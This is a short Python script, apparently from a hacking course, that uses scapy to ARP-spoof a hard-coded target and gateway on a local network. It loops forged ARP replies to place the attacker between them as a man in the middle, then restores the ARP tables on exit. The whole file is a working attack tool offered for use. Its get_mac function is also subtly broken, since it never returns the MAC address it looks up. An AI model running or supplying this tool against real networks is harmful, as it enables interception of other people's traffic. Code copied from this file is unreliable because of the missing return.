#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) # verbose - dont flood on screen
    # scapy.ls(scapy.ARP) - to see what packet  consist of
    # psrc - router IP
    # op Short enum field - ARP response
    # print(packet.show())
    # print(packet.summary())


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # target_mac="08:00:27:ee:32:d7"
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.79"
gateway_ip = "192.168.1.254"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        # we are router
        spoof(gateway_ip, target_ip)
        # we are client
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        # dynamic printing
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C . . . . . Quitting.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
